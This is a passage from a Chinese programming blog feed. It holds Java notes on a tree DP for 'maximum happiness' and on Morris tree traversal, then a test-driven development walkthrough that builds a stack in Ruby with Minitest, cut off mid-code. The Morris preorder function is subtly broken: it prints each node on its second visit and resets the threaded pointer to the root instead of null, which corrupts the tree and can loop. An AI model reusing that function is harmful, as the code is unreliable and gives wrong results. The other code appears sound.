            <span class="token keyword">this</span><span class="token punctuation">.</span>maxDeepLen <span class="token operator">=</span> maxDeepLen<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>maxConnect <span class="token operator">=</span> maxConnect<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>派顿最大快乐值（多叉树）</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//派顿最大快乐值（多叉树）</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ReturnTypeByMaxHappy</span> <span class="token class-name">MaxHappy</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> employee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>employee<span class="token punctuation">.</span>subordinates<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnTypeByMaxHappy</span><span class="token punctuation">(</span>employee<span class="token punctuation">.</span>happy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//如果当前节点来 返回值</span>
        <span class="token keyword">int</span> lai <span class="token operator">=</span> employee<span class="token punctuation">.</span>happy<span class="token punctuation">;</span>
        <span class="token comment">//不来</span>
        <span class="token keyword">int</span> bu <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> subordinate <span class="token operator">:</span> employee<span class="token punctuation">.</span>subordinates<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">ReturnTypeByMaxHappy</span> ret <span class="token operator">=</span> <span class="token class-name">MaxHappy</span><span class="token punctuation">(</span>subordinate<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//如果我来  底下人不能来</span>
            lai <span class="token operator">+=</span> ret<span class="token punctuation">.</span>buMaxHappy<span class="token punctuation">;</span>
            <span class="token comment">//如果我不来  底下人可以来可以不来  取最大值</span>
            bu <span class="token operator">+=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ret<span class="token punctuation">.</span>laiMaxHappy<span class="token punctuation">,</span> ret<span class="token punctuation">.</span>buMaxHappy<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnTypeByMaxHappy</span><span class="token punctuation">(</span>lai<span class="token punctuation">,</span>bu<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ReturnTypeByMaxHappy</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> laiMaxHappy<span class="token punctuation">;</span>
        <span class="token keyword">int</span> buMaxHappy<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">ReturnTypeByMaxHappy</span><span class="token punctuation">(</span><span class="token keyword">int</span> laiMaxHappy<span class="token punctuation">,</span> <span class="token keyword">int</span> buMaxHappy<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>laiMaxHappy <span class="token operator">=</span> laiMaxHappy<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>buMaxHappy <span class="token operator">=</span> buMaxHappy<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> happy<span class="token punctuation">;</span>  <span class="token comment">//该员工的快乐值</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> subordinates<span class="token punctuation">;</span>  <span class="token comment">//直接下级</span>

    <span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token keyword">int</span> happy<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> subordinates<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>happy <span class="token operator">=</span> happy<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>subordinates <span class="token operator">=</span> subordinates<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a name="lhcRd"></a></p>
<h1 id="树结构Morris遍历"><a href="#树结构Morris遍历" class="headerlink" title="树结构Morris遍历"></a>树结构Morris遍历</h1><p><a name="TbFyW"></a></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2></li>
</ol>
<p><strong>我们能不能做到遍历整棵树，时间复杂度为o(n)，空间复杂度为o(1),利用原树种大量空闲指针</strong><br /><strong>很多关于树结构的题，以morris为基础求出最优解。（笔试还是用正常的遍历就好，错误率低）</strong><br /><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hd7yc2vwj30st0iitbo.jpg" alt="image-20221125143908385"></p>
<ol>
<li><p><strong>利用morris进行遍历树结构</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Morris先序遍历</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Morris_F</span><span class="token punctuation">(</span>tree node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        tree cur <span class="token operator">=</span> node<span class="token punctuation">;</span>
        tree mostRight <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>mostRight<span class="token punctuation">.</span>right<span class="token operator">!=</span>cur<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>
                    cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">//这里说明是遍历到cur第一次</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> node<span class="token punctuation">;</span>
                    cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">//这里说明是最底层节点  没有左节点 在右转前输出一次</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//Morris中序遍历</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Morris_M</span><span class="token punctuation">(</span>tree node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        tree cur <span class="token operator">=</span> node<span class="token punctuation">;</span>
        tree mostRight <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>
                 <span class="token keyword">while</span> <span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>mostRight<span class="token punctuation">.</span>right<span class="token operator">!=</span>cur<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                     mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>
                 <span class="token punctuation">&#125;</span>
                 <span class="token keyword">if</span> <span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                     mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>
                     cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>
                     <span class="token keyword">continue</span><span class="token punctuation">;</span>
                 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                     mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                 <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a name="zwEgb"></a></p>
<h1 id="dp套路与Morris套路什么时候使用"><a href="#dp套路与Morris套路什么时候使用" class="headerlink" title="dp套路与Morris套路什么时候使用"></a>dp套路与Morris套路什么时候使用</h1></li>
<li><p><strong>当我们的方法必须做第三次信息的强整合，也就是说我最后的决策必须依赖于左右两边的信息，我们使用dp套路，因为Morris每个点只返回两次。</strong></p>
</li>
<li><p><strong>如果不需要则就可以使用Morris。</strong></p>
</li>
</ol>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>如何测试驱动开发</title>
    <url>//post/%E6%B5%8B%E8%AF%95/%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91.html</url>
    <content><![CDATA[<blockquote>
<p>前言</p>
</blockquote>
<p>​    最近在读《匠艺整洁之道-程序员的职业修养》这本书，作者鲍勃大叔开篇就用了大量的示例来讨论与演示为什么需要和如何操作测试驱动开发。我是之前写过测试，但从不知道测试如何驱动开发，大部分情况下也只是先写生产代码，写好后再测试，看看是否能调通，再修改代码中隐藏的问题。<br>​    而测试驱动开发会扭转这种思维方式，是先写测试，再写对应的生产代码。这一开始让人会觉得很奇怪，感觉并且很麻烦，但当你尝试一下，就会发现这事儿挺有趣，且神奇。<br>​    温馨提示：<a href="https://learning.oreilly.com/videos/clean-craftsmanship-disciplines/9780137676385/9780137676385-CCC1_clean_craftsmanship_stack/">Clean Craftsmanship: Disciplines, Standards, and Ethics (Companion Videos)</a>，这个是该书示例操作的视频说明，<strong>非常非常非常有用！！！</strong> 第一篇是讲述如何通过测试驱动开发来写一个栈结构。我严重怀疑大叔是不是一边写代码一边喝啤酒。整个过程伴随大叔魔性的笑声和宛如魔法般的操作，就好像他在不停调戏编译器。你会通过这个视频感受到如何从零开始，进行测试驱动开发。<br>​    下面将讲讲一些基础知识。</p>
<blockquote>
<p>为什么需要测试驱动开发？</p>
</blockquote>
<p>​    就我目前的现状，我能感受到重构代码时的痛苦，在目前维护的项目中会遇到几百行的函数，整个函数要做太多的事儿，而且相互耦合在一起，如果这里的需求不变，我不会去碰它，但需求是一直变化的，我只能不断去读这些代码，然后小心翼翼的在里面修改。当上线时心惊胆战，生怕出问题。我希望有一套良好的测试能在我修改代码后告诉我哪里受到了影响，并在测试通过后，能让我安心上线。</p>
<h2 id="TDD纪律"><a href="#TDD纪律" class="headerlink" title="TDD纪律"></a>TDD纪律</h2><ol>
<li>创建测试集，方便重构，并且其可信程度达到系统可部署的水平，也就是说测试集通过，系统就可以部署。<ol>
<li>我不知道有多少人像我一样，由于老系统没有测试，导致每次上线都很害怕，担心修改引入新的问题。</li>
</ol>
</li>
<li>创建足够解耦，可测试，可重构的代码</li>
<li>创建极短的反馈循环周期</li>
<li>创建相互解耦的测试代码和生产代码</li>
</ol>
<p>上面的纪律需要下面展示的法则作为基础，如果没有一些技巧和知识就很难遵守这些法则。</p>
<h2 id="TDD三法则"><a href="#TDD三法则" class="headerlink" title="TDD三法则"></a>TDD三法则</h2><p><strong>第一法则</strong>：在编写因为缺少生产代码而必然会失败的测试之前，绝不编写生产代码<br><strong>第二法则</strong>：只写刚好导致失败或者通不过编译的测试，编写生产代码来解决失败的问题<br><strong>第三法则</strong>:  只写刚好能解决当前测试失败问题的生产代码。测试通过后，立即写其他测试代码<br>整个过程看起来好像是：</p>
<ul>
<li>写一行测试代码，无法通过编译</li>
<li>写一行生产代码，编译成功</li>
<li>写另一行测试代码，无法通过编译</li>
<li>再写生产代码，编译成功</li>
<li>再写测试代码，编译能成功，但断言失败</li>
<li>写一两行生产代码，满足断言</li>
</ul>
<p>如此循环，贯穿始终</p>
<blockquote>
<p>遵守上述法则后，有以下好处</p>
</blockquote>
<ul>
<li>提高效率，减少调试的时间</li>
<li>将产出一套低层次文档</li>
<li>好玩</li>
<li>将产出一套测试集，让你有信息部署系统</li>
<li>将创建较少耦合的代码<h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><blockquote>
<p>这里建议先看我上面提供的链接，作者是用Java写的，我这里用Ruby(核心思想是一致的)</p>
</blockquote>
</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'minitest/autorun'</span></span>
<span class="token keyword">class</span> <span class="token class-name">StackTest</span> <span class="token operator">&lt;</span> Minitest<span class="token double-colon punctuation">::</span>Test
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_nothing</span></span>
    
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    这里我们一开始写一个什么都不做的测试，然后保证这个测试通过，这至少能说明你的环境没问题</p>
<hr>
<p>规则1：先编写测试，逼着自己写将要写的代码</p>
<hr>
<p>​    我们知道我们需要一个栈</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack_test.rb</span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'minitest/autorun'</span></span>
<span class="token keyword">class</span> <span class="token class-name">StackTest</span> <span class="token operator">&lt;</span> Minitest<span class="token double-colon punctuation">::</span>Test
  <span class="token comment"># ...</span>
  
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_canCreateStack</span></span>
    stack <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">.</span><span class="token keyword">new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    这里的测试一定会失败，因为现在根本没有<code>Stack</code>这个类结构，所以我们写两行生产代码来通过测试</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack.rb</span>
<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    这次我们在<code>stack_test.rb</code>引入一下，就可以通过测试了。</p>
<hr>
<p>规则2：让测试失败，让测试通过，清理代码</p>
<hr>
<p>​    这时候我们发现我们还没有断言行为呢，比如当刚创建一个栈时，这个栈应该是空的。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'minitest/autorun'</span></span>
require_relative <span class="token string-literal"><span class="token string">'stack'</span></span>
<span class="token keyword">class</span> <span class="token class-name">StackTest</span> <span class="token operator">&lt;</span> Minitest<span class="token double-colon punctuation">::</span>Test
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_nothing</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_canCreateStack</span></span>
    stack <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">.</span><span class="token keyword">new</span>
    assert<span class="token punctuation">(</span>stack<span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># => 报错：NoMethodError: undefined method `isEmpty?'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    我们迅速补上生产代码，来解决这个问题</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    <span class="token boolean">false</span> 
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    这样改后，方法可以找到了，但断言失败了，这里我们是故意的，为什么这么做呢？第一法则：测试必须失败，为啥呢？因为当测试应该失败时，我们就能看到它失败，我们测试了自己的测试。当我们将上面的方法返回true时，就能测试另一半了。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    <span class="token boolean">true</span> 
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    这时候执行测试，测试通过，万事大吉，你一定会骂这不是作弊吗，但等等，至少我们只用几秒就能测出该通过时通过，该失败时失败。</p>
<p>​    下一个要测的是，栈需要能push吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'minitest/autorun'</span></span>
require_relative <span class="token string-literal"><span class="token string">'stack'</span></span>
<span class="token keyword">class</span> <span class="token class-name">StackTest</span> <span class="token operator">&lt;</span> Minitest<span class="token double-colon punctuation">::</span>Test
  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_canPush</span></span>
    stack <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">.</span><span class="token keyword">new</span>
    stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    这里会报错，因为找不到方法，我们就跟着改改生产代码</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># stack.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    <span class="token boolean">true</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">push</span></span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    执行测试，测试通过，但这里我们没有断言啊，那既然push了，栈就不应为空吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'minitest/autorun'</span></span>
require_relative <span class="token string-literal"><span class="token string">'stack'</span></span>
<span class="token keyword">class</span> <span class="token class-name">StackTest</span> <span class="token operator">&lt;</span> Minitest<span class="token double-colon punctuation">::</span>Test
  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_canPush</span></span>
    stack <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">.</span><span class="token keyword">new</span>
    stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    refute<span class="token punctuation">(</span>stack<span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    执行测试，断言失败，因为我们返回的一直是true，那改改代码吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Stack</span>
  attr_accessor <span class="token symbol">:empty</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    empty
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">push</span></span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">false</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    我们抽离出一个实例变量来保存是否为空，并在push后直接暴力设置为false。这时候测试又能通过了<br>我们发现没写一个测试方法，都要创建一个栈，太麻烦了，于是我们重构一下，使用<code>setup方法</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'minitest/autorun'</span></span>
require_relative <span class="token string-literal"><span class="token string">'stack'</span></span>

<span class="token keyword">class</span> <span class="token class-name">StackTest</span> <span class="token operator">&lt;</span> Minitest<span class="token double-colon punctuation">::</span>Test
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">setup</span></span>
    <span class="token variable">@stack</span> <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">.</span><span class="token keyword">new</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_nothing</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_canCreateStack</span></span>
    assert<span class="token punctuation">(</span><span class="token variable">@stack</span><span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_canPush</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    refute<span class="token punctuation">(</span><span class="token variable">@stack</span><span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试依然能通过，不过canPush这个测试名不太好，我们改改（test_操作_结果）</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_afterOnePush_isEmpty</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    refute<span class="token punctuation">(</span><span class="token variable">@stack</span><span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    当然测试还是能通过</p>
<p>​    这时候我们测试，栈push一次，也能pop一次吧，并且这时候栈应该为空</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_afterOnePushAndOnePop_isEmpty</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>pop
    assert<span class="token punctuation">(</span><span class="token variable">@stack</span><span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试失败，因为没有这个方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token comment"># ...</span>
  
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pop</span></span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    现在测试又通过了，现在我们测试两次push之后，栈的尺寸应该是2</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_afterTwoPushs_sizeIsTwo</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    assert_equal<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token variable">@stack</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试失败，因为没有这个方法，我们修改生产代码</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Stack</span>
